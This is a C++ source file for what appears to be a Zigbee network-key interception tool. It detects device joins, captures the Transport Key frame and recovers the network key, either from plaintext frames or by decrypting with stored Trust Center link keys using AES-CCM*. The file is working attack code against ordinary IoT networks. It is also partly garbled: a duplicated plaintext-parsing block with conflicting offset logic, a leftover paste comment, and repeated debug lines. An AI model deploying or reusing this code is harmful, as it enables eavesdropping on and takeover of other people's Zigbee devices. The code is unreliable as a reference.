/*
 * ZbKeyCapture.cpp — Zigbee Network Key interception
 *
 * Transport Key frame structure during join:
 *   NWK layer: UNENCRYPTED (zbNwkSecurityEnabled = 0)
 *   APS layer: ENCRYPTED with TCLK (AES-128-CCM*)
 *
 * APS security aux header (embedded in APS payload):
 *   APS FC (1) | APS Aux Sec: secCtrl(1)+fc(4)+[extSrc(8)]+keySeq(1) | ciphertext | MIC(4)
 *
 * CCM* nonce (13 bytes, Zigbee spec 4.5.1):
 *   src EUI64 (8, LE) | frame counter (4, LE) | sec ctrl byte (1)
 *
 * AAD for APS-layer decryption:
 *   NWK header + APS FC byte (everything before the APS AUX security header)
 */

#include "ZbKeyCapture.h"
#include "mbedtls/ccm.h"

#define APS_CMD_TRANSPORT_KEY   0x05
#define APS_KEY_TYPE_NWK        0x01
#define ZB_MIC_LEN              4

uint64_t _coordinatorEUI64 = 0;

ZbKeyCapture::ZbKeyCapture(IEEE802154Sniffer &sniffer)
    : _sniffer(sniffer), onKeyCapture(nullptr)
{
    memset(_joins, 0, sizeof(_joins));
}



// -- Public --------------------------------------------------------------------

bool ZbKeyCapture::processFrame(const FrameInfo &info,
                                 const uint8_t *rawFrame, uint8_t rawLen,
                                 uint8_t macPayloadOffset) {

    if (info.frameType == FC_FRAME_TYPE_MAC_CMD) {
        // Resolve pending extended-addr join to short addr on first MAC cmd
        // from new device (Data Request right after Assoc Response)
        JoinState *pending = _findJoin(0xFFFE);
        if (pending && info.macSrc != 0xFFFE && !_findJoin(info.macSrc)) {
            pending->shortAddr = info.macSrc;
            Serial.printf("[KeyCapture] Resolved join: EUI64=%016llX → 0x%04X\n",
                          pending->extAddr, info.macSrc);
        }
        // Check for Association Response (MAC cmd 0x02)
        if (rawLen > macPayloadOffset && rawFrame[macPayloadOffset] == 0x02) {
            _handleAssocResponse(info);
        }
        return false;
    }

    if (info.srcExtended != 0 && 
        (info.macSrc == 0x0000 || info.route.nwkSrc == 0x0000)) {
            _coordinatorEUI64 = info.srcExtended;
            }

    // Only Zigbee data frames — NWK layer NOT necessarily encrypted
    if (info.protocol == FrameProtocol::ZIGBEE &&
        info.frameType == FC_FRAME_TYPE_DATA) {
        if (macPayloadOffset >= rawLen) return false;
        return _handleTransportKey(info,
                                   &rawFrame[macPayloadOffset],
                                   rawLen - macPayloadOffset);
    }

    return false;
}

void ZbKeyCapture::expireJoins(uint32_t timeout_ms) {
    uint32_t now = millis();
    for (int i = 0; i < MAX_PENDING_JOINS; i++) {
        if (_joins[i].active &&
            (now - _joins[i].assocTime_ms) > timeout_ms) {
            Serial.printf("[KeyCapture] Join timeout for 0x%04X\n",
                          _joins[i].shortAddr);
            _joins[i].active = false;
        }
    }
}

// -- Join state ----------------------------------------------------------------

JoinState *ZbKeyCapture::_findJoin(uint16_t addr) {
    for (int i = 0; i < MAX_PENDING_JOINS; i++)
        if (_joins[i].active && _joins[i].shortAddr == addr) return &_joins[i];
    return nullptr;
}

JoinState *ZbKeyCapture::_allocJoin(uint16_t addr) {
    for (int i = 0; i < MAX_PENDING_JOINS; i++) {
        if (!_joins[i].active) {
            _joins[i].active       = true;
            _joins[i].shortAddr    = addr;
            _joins[i].extAddr      = 0;
            _joins[i].assocTime_ms = millis();
            return &_joins[i];
        }
    }
    // Evict oldest
    JoinState *oldest = &_joins[0];
    for (int i = 1; i < MAX_PENDING_JOINS; i++)
        if (_joins[i].assocTime_ms < oldest->assocTime_ms) oldest = &_joins[i];
    oldest->active       = true;
    oldest->shortAddr    = addr;
    oldest->extAddr      = 0;
    oldest->assocTime_ms = millis();
    return oldest;
}

void ZbKeyCapture::_freeJoin(JoinState *j) { if (j) j->active = false; }

// -- Association Response ------------------------------------------------------

void ZbKeyCapture::_handleAssocResponse(const FrameInfo &info) {
    // Assoc Response comes from router (not necessarily coordinator)
    // Device may be addressed by EUI64 (extended addr mode) before getting short addr
    JoinState *j;
    if (info.dstAddrMode == ADDR_MODE_EXTENDED) {
        j = _allocJoin(0xFFFE);           // placeholder until Data Request reveals short addr
        j->extAddr = info.dstExtended;
        Serial.printf("[KeyCapture] Join (ext addr): EUI64=%016llX\n", info.dstExtended);
    } else {
        j = _allocJoin(info.macDst);
        j->extAddr = info.dstExtended;
        Serial.printf("[KeyCapture] Join detected: 0x%04X EUI64=%016llX\n",
                      info.macDst, info.dstExtended);
    }
}

// -- Transport Key handler -----------------------------------------------------

bool ZbKeyCapture::_handleTransportKey(const FrameInfo &info,
                                        const uint8_t *nwkPayload,
                                        uint8_t nwkLen) {
    // Must be unicast to a recently-joined device
    if (is_bcast(info.route.nwkDst)) return false;
    JoinState *j = _findJoin(info.route.nwkDst);

    // If nwkDst didn't match, coordinator may be sending via parent router.
    // Try matching any active join when frame originates from coordinator.
    if (!j && info.route.nwkSrc == 0x0000) {
        for (int i = 0; i < MAX_PENDING_JOINS; i++) {
            if (_joins[i].active) { j = &_joins[i]; break; }
        }
    }

    if (!j) return false;

    Serial.printf("[KC] Transport Key candidate: nwkLen=%u nwkSrc=0x%04X dst=0x%04X\n",
                  nwkLen, info.route.nwkSrc, info.route.nwkDst);
    Serial.print("[KC] NWK: ");
    for (int i = 0; i < min((uint8_t)32, nwkLen); i++)
        Serial.printf("%02X ", nwkPayload[i]);
    Serial.println();

    // Navigate NWK header to find APS payload
    uint8_t apsOffset = 0;
    if (!_skipNwkHeader(nwkPayload, nwkLen, apsOffset)) {
        Serial.println("[KC] Could not parse NWK header");
        return false;
    }
    Serial.printf("[KC] apsOffset=%u\n", apsOffset);

    if (apsOffset >= nwkLen) return false;

    // Parse APS FC byte to determine if APS-secured


uint8_t apsFc = nwkPayload[apsOffset];
    uint8_t apsFrameType   = apsFc & 0x03;
    bool    apsSecured     = (apsFc >> 5) & 0x01;

    Serial.printf("[KC] APS FC=0x%02X type=%u secured=%u\n",
                  apsFc, apsFrameType, apsSecured);

    // Check if APS payload is actually encrypted or just MIC-authenticated
    if (apsSecured && apsOffset + 1 < nwkLen) {
        uint8_t auxSecCtrl = nwkPayload[apsOffset + 1];
        uint8_t secLevel   = auxSecCtrl & 0x07;

        if (secLevel == 0x01 || secLevel == 0x00) {
            // MIC-32 only or no security — payload is plaintext
            // Parse APS command directly after AUX header
            uint8_t auxLen = 5;                        // secCtrl(1)+fc(4)
            if ((auxSecCtrl >> 6) & 1) auxLen += 8;   // extSrc
            auxLen += 1;                               // keySeq
            uint8_t apsPayloadOff = apsOffset + 1 + auxLen;

            Serial.printf("[KC] secLevel=%u — plaintext APS, apsPayloadOff=%u\n",
                          secLevel, apsPayloadOff);

            if (apsPayloadOff + ZB_MIC_LEN < nwkLen) {
                uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
                uint8_t keySeqNum = 0;
                if (_parseTransportKey(&nwkPayload[apsPayloadOff],
                                       nwkLen - apsPayloadOff - ZB_MIC_LEN,
                                       networkKey, keySeqNum)) {
                    Serial.printf("[KeyCapture] *** Network key captured (plaintext)! seq=%u ***\n", keySeqNum);
                    Serial.print("[KeyCapture] Key: ");
                    for (int i = 0; i < ZIGBEE_KEY_LEN; i++)
                        Serial.printf("%02X%s", networkKey[i], i < ZIGBEE_KEY_LEN-1 ? ":" : "\n");

                    char label[16];
                    snprintf(label, sizeof(label), "NWK-seq%u", keySeqNum);
                    _sniffer.addKey(ZbKeyType::NETWORK, networkKey, keySeqNum, label);
                    _freeJoin(j);
                    if (onKeyCapture) {
                        ZbKey *captured = _sniffer.findNetworkKey(keySeqNum);
                        if (captured) onKeyCapture(*captured);
                    }
                    return true;
                }
            }
        }
    }


// ... after APS FC parse ...

    uint8_t auxSecCtrl = nwkPayload[apsOffset + 1];
    uint8_t secLevel   = auxSecCtrl & 0x07;

    Serial.printf("[KC] APS FC=0x%02X type=%u secured=%u secLevel=%u\n",
                  apsFc, apsFrameType, apsSecured, secLevel);

    // Plaintext path — secLevel 0 or 1 means no encryption
    if (apsSecured && (secLevel == 0x00 || secLevel == 0x01)) {
        uint8_t auxLen = 6;                        // secCtrl(1)+fc(4)+keySeq(1)
        if ((auxSecCtrl >> 6) & 1) auxLen += 8;   // extSrc
        uint8_t apsPayloadOff = apsOffset + 1 + auxLen;
        Serial.printf("[KC] plaintext APS at offset=%u\n", apsPayloadOff);
        if (apsPayloadOff + ZB_MIC_LEN < nwkLen) {
            uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
            uint8_t keySeqNum = 0;
            if (_parseTransportKey(&nwkPayload[apsPayloadOff],
                                   nwkLen - apsPayloadOff - ZB_MIC_LEN,
                                   networkKey, keySeqNum)) {
                Serial.printf("[KeyCapture] *** Network key (plaintext)! seq=%u ***\n", keySeqNum);
                Serial.print("[KeyCapture] Key: ");
                for (int i = 0; i < ZIGBEE_KEY_LEN; i++)
                    Serial.printf("%02X%s", networkKey[i], i < 15 ? ":" : "\n");
                char label[16];
                snprintf(label, sizeof(label), "NWK-seq%u", keySeqNum);
                _sniffer.addKey(ZbKeyType::NETWORK, networkKey, keySeqNum, label);
                _freeJoin(j);
                return true;
            }
        }
        // plaintext parse failed — fall through to TCLK attempt anyway
    }


    // Try TCLK decryption for encrypted payloads (secLevel >= 5)
        // Try each TCLK we have
        for (int ki = 0; ki < _sniffer.keys.size(); ki++) {
            ZbKey *k = _sniffer.keys.get(ki);
            if (k->type != ZbKeyType::TRUST_CENTER_LINK) continue;

        uint8_t plaintext[64] = {};
        uint8_t plaintextLen  = 0;
        bool ok = false;

        if (apsSecured) {
            uint64_t coordEUI64 = 0;
            HostRecord *coord = _sniffer.findHost(0x0000);
            if (coord) coordEUI64 = coord->extAddr;
            Serial.printf("[KC] coordEUI64=%016llX\n", coordEUI64);

// DEBUG
Serial.printf("[KC] coordEUI64=%016llX\n", coordEUI64);
uint8_t *eu = (uint8_t*)&coordEUI64;
Serial.printf("[KC] EUI64 bytes: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X\n",
    eu[0],eu[1],eu[2],eu[3],eu[4],eu[5],eu[6],eu[7]);


            ok = _decryptApsPayload(nwkPayload, nwkLen, apsOffset,
                                     k->key, coordEUI64,
                                     plaintext, plaintextLen);
        } else if (info.zbNwkSecurityEnabled) {
            ok = _decryptNwkPayload(nwkPayload, nwkLen, apsOffset,
                                     k->key, plaintext, plaintextLen);
        }


        if (!ok) continue;

        // Parse the decrypted APS payload
        uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
        uint8_t keySeqNum = 0;
        if (!_parseTransportKey(plaintext, plaintextLen, networkKey, keySeqNum)) {
            Serial.println("[KC] APS parse failed after decrypt");
            continue;
        }


        Serial.printf("[KeyCapture] *** Network key captured! seq=%u ***\n", keySeqNum);
        Serial.print("[KeyCapture] Key: ");
        for (int i = 0; i < ZIGBEE_KEY_LEN; i++)
            Serial.printf("%02X%s", networkKey[i], i < ZIGBEE_KEY_LEN-1 ? ":" : "\n");

        char label[16];
        snprintf(label, sizeof(label), "NWK-seq%u", keySeqNum);
        _sniffer.addKey(ZbKeyType::NETWORK, networkKey, keySeqNum, label);
        _freeJoin(j);

        if (onKeyCapture) {
            ZbKey *captured = _sniffer.findNetworkKey(keySeqNum);
            if (captured) onKeyCapture(*captured);
        }
        return true;
    }

    Serial.printf("[KC] Decrypt failed for 0x%04X\n", info.route.nwkDst);
    return false;
}

// -- Skip NWK header → apsOffset points to APS payload ------------------------

bool ZbKeyCapture::_skipNwkHeader(const uint8_t *p, uint8_t len,
                                   uint8_t &apsOffset) {
    if (len < 8) return false;

    uint16_t nwkFc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
    uint8_t off = 8;  // FC(2)+dst(2)+src(2)+radius(1)+seq(1)

    // Optional multicast control (bit 8 of FC high byte)
    if ((nwkFc >> 8) & 0x01) { if (off + 1 > len) return false; off++; }

    // Optional extended destination
    if (nwkFc & ZB_NWK_FC_EXT_DST) { if (off + 8 > len) return false; off += 8; }

    // Optional extended source
    if (nwkFc & ZB_NWK_FC_EXT_SRC) { if (off + 8 > len) return false; off += 8; }

    // Source route subframe
    if (nwkFc & ZB_NWK_FC_SOURCE_ROUTE) {
        if (off + 2 > len) return false;
        uint8_t relayCount = p[off];
        off += 2 + relayCount * 2;
        if (off > len) return false;
    }

    // If NWK security is set, skip the NWK AUX security header too
    bool nwkSec = (nwkFc >> 1) & 0x01;
    if (nwkSec) {
        // AUX header: secCtrl(1)+fc(4)+[extSrc(8)]+keySeq(1)
        if (off + 6 > len) return false;
        uint8_t secCtrl = p[off];
        bool hasExtSrc = (secCtrl >> 6) & 0x01;
        off += 6;                        // secCtrl + fc + keySeq
        if (hasExtSrc) { if (off + 8 > len) return false; off += 8; }
    }

    apsOffset = off;
    return true;
}

// -- APS-layer decryption ------------------------------------------------------
// Called when APS FC bit 5 (security) is set.
// Structure at nwkPayload[apsOffset]:
//   APS FC (1) | APS AUX: secCtrl(1)+fc(4)+[extSrc(8)]+keySeq(1) | ciphertext | MIC(4)
bool ZbKeyCapture::_decryptApsPayload(const uint8_t *nwkPayload, uint8_t nwkLen,
                                       uint8_t apsOffset,
                                       const uint8_t *key,
                                       uint64_t knownExtSrc,
                                       uint8_t *plaintextOut,
                                       uint8_t &plaintextLen) {

    

    // APS FC is at apsOffset — APS AUX header starts at apsOffset+1
    uint8_t auxStart = apsOffset + 1;
    if (auxStart + 6 > nwkLen) return false;

    const uint8_t *aux = &nwkPayload[auxStart];
    uint8_t secCtrl = aux[0];
    uint32_t frameCounter = (uint32_t)aux[1] | ((uint32_t)aux[2] << 8) |
                            ((uint32_t)aux[3] << 16) | ((uint32_t)aux[4] << 24);
    bool hasExtSrc = (secCtrl >> 6) & 0x01;

    uint8_t auxOff = 5;
    uint8_t srcEui64[8] = {};

    if (hasExtSrc) {
        if (auxOff + 8 > (nwkLen - auxStart)) return false;
        memcpy(srcEui64, &aux[auxOff], 8);
        auxOff += 8;
    } else if (knownExtSrc != 0) {
        // Use EUI64 from join state (coordinator's EUI64)
        memcpy(srcEui64, &knownExtSrc, 8);
    }
    // keySeq
    if (auxOff + 1 > (nwkLen - auxStart)) return false;
    auxOff++;  // skip keySeq




    // Ciphertext starts after AUX header, ends before MIC
    uint8_t encStart = auxStart + auxOff;
    if (encStart + ZB_MIC_LEN >= nwkLen) return false;
    uint8_t encLen = nwkLen - encStart - ZB_MIC_LEN;
    if (encLen > 63) return false;

    const uint8_t *ciphertext = &nwkPayload[encStart];
    const uint8_t *mic        = &nwkPayload[nwkLen - ZB_MIC_LEN];

    // Nonce: srcEUI64(8) + frameCounter(4,LE) + secCtrl(1)
    uint8_t nonce[13];
    memcpy(nonce, srcEui64, 8);
    nonce[8]  = aux[1]; nonce[9]  = aux[2];
    nonce[10] = aux[3]; nonce[11] = aux[4];
    nonce[12] = secCtrl;

    // AAD = NWK header + APS FC byte (everything before APS AUX header)
    // i.e. nwkPayload[0..apsOffset] inclusive
    const uint8_t *aad = nwkPayload;
    uint8_t aadLen = auxStart;  // up to but not including the AUX header


    Serial.printf("[KC] nonce: %02X%02X%02X%02X%02X%02X%02X%02X fc=%08lX sc=%02X\n",
    srcEui64[0],srcEui64[1],srcEui64[2],srcEui64[3],
    srcEui64[4],srcEui64[5],srcEui64[6],srcEui64[7],
    frameCounter, secCtrl);
    Serial.printf("[KC] encStart=%u encLen=%u aadLen=%u\n", encStart, encLen, aadLen);

    bool ok = _ccmDecrypt(key, nonce, aad, aadLen,
                           ciphertext, encLen,
                           plaintextOut, mic, ZB_MIC_LEN);
    if (ok) plaintextLen = encLen;
    return ok;
}

// -- NWK-layer decryption (fallback) ------------------------------------------

bool ZbKeyCapture::_decryptNwkPayload(const uint8_t *frame, uint8_t frameLen,
                                       uint8_t apsOffset,
                                       const uint8_t *key,
                                       uint8_t *plaintextOut,
                                       uint8_t &plaintextLen) {
    const uint8_t *aux = &frame[apsOffset];
    uint8_t remaining = frameLen - apsOffset;
    if (remaining < 6) return false;

    uint8_t  secCtrl      = aux[0];
    uint32_t frameCounter = (uint32_t)aux[1] | ((uint32_t)aux[2] << 8) |
                            ((uint32_t)aux[3] << 16) | ((uint32_t)aux[4] << 24);
    bool hasExtSrc = (secCtrl >> 6) & 0x01;

    uint8_t auxOff = 5;
    uint8_t srcEui64[8] = {};
    if (hasExtSrc) {
        if (auxOff + 8 > remaining) return false;
        memcpy(srcEui64, &aux[auxOff], 8);
        auxOff += 8;
    }
    if (auxOff + 1 > remaining) return false;
    auxOff++;  // keySeq

    uint8_t encOffset = apsOffset + auxOff;
    if (encOffset + ZB_MIC_LEN >= frameLen) return false;
    uint8_t encLen = frameLen - encOffset - ZB_MIC_LEN;
    if (encLen > 63) return false;

    const uint8_t *ciphertext = &frame[encOffset];
    const uint8_t *mic        = &frame[frameLen - ZB_MIC_LEN];

    uint8_t nonce[13];
    memcpy(nonce, srcEui64, 8);
    memcpy(nonce + 8, &aux[1], 4);
    nonce[12] = secCtrl;

    bool ok = _ccmDecrypt(key, nonce, frame, encOffset,
                           ciphertext, encLen,
                           plaintextOut, mic, ZB_MIC_LEN);
    if (ok) plaintextLen = encLen;
    return ok;
}

// -- AES-128-CCM* via mbedtls --------------------------------------------------

bool ZbKeyCapture::_ccmDecrypt(const uint8_t *key,
                                const uint8_t *nonce,
                                const uint8_t *aad,    uint8_t aadLen,
                                const uint8_t *ct,     uint8_t ctLen,
                                uint8_t       *pt,
                                const uint8_t *mic,    uint8_t micLen) {
    mbedtls_ccm_context ctx;
    mbedtls_ccm_init(&ctx);

    int ret = mbedtls_ccm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key, 128);
    if (ret != 0) { mbedtls_ccm_free(&ctx); return false; }

    ret = mbedtls_ccm_star_auth_decrypt(&ctx,
                                         ctLen, nonce, 13,
                                         aad, aadLen,
                                         ct, pt,
                                         mic, micLen);
    mbedtls_ccm_free(&ctx);
    return (ret == 0);
}

// -- Parse decrypted APS Transport Key ----------------------------------------

bool ZbKeyCapture::_parseTransportKey(const uint8_t *aps, uint8_t apsLen,
                                       uint8_t *networkKeyOut,
                                       uint8_t &seqNumOut) {
    if (apsLen < 2) return false;

    uint8_t apsFc        = aps[0];
    uint8_t apsFrameType = apsFc & 0x03;

    // APS command frame type = 0x01
    if (apsFrameType != 0x01) return false;

    uint8_t cmdId = aps[1];
    if (cmdId != APS_CMD_TRANSPORT_KEY) return false;

    // key_type(1) + key(16) + seq(1) + dst_eui64(8) + src_eui64(8) = 34 bytes
    if (apsLen < 2 + 34) return false;

    uint8_t keyType = aps[2];
    if (keyType != APS_KEY_TYPE_NWK) {
        Serial.printf("[KC] Transport Key type=0x%02X (not NWK)\n", keyType);
        return false;
    }

    memcpy(networkKeyOut, &aps[3], ZIGBEE_KEY_LEN);
    seqNumOut = aps[3 + ZIGBEE_KEY_LEN];
    return true;
}
